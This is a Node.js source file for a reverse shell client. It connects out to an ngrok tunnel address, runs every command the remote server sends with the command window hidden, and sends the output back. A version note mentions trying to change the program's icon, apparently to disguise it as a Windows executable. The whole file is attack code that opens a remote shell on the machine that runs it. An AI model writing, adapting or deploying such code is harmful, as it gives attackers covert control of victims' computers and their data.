const mngVersion = {
    'version' : 'v0.2',
    'description' : 'Attempted to change icon using Resourcehacker but could not be changed due to Binary file execution error'
}
const net = require("net")
const childprocess = require("child_process")
const HOST_PORT = 18196; // [서버 포트 입력]
const HOST_Address = 0.tcp.eu.ngrok.io // [도메인 입력]


let retrying = false; 
let retryingCnt = 5; //재연결 시도 횟수

const runConnection =() => {
    if(retryingCnt === 5){
        console.log(`:>>> Revershell Client ${mngVersion.version} <<<:`);
        console.log(`:>> Try to access the server using port ${HOST_PORT} <<:`);
    };
    socket.connect(HOST_PORT, HOST_Address)
}

const connectEventHandler =(data) => {
    console.log(':>> Connected \n');
    retrying = false;
}

const dataEventHandler = (data) => {
    if(data.length > 1){
        console.log(`:>> Remote Command: ${data.toString()}`)
        
        let command = data.toString(); 
        let option = {
            windowsHide: true
        }
        cp = childprocess.execSync(command+`\n`,option);
        socket.write(`ChildProcess Result : ${cp.toString()}`);
    }
}

const endEventHandler =() => {
    console.log(`:> [-[-[-[-[-[-[-[-[-[-_-]-]-]-]-]-]-]-]-]-]... <:`)
}

const closeEventHandler =() => {
    if(!retrying){
        console.log(`:> Retry ${retryingCnt}.`)
        retryingCnt--;
        if(retryingCnt === 0){
            socket.emit('end')
        } else{
            setTimeout(runConnection, 5000)
        }
    } else{
        socket.emit('end')
    }
}


var socket = new net.Socket();
socket.on('connect', connectEventHandler);
socket.on('data',    dataEventHandler);
socket.on('end',     endEventHandler);
socket.on('close',   closeEventHandler);

runConnection();
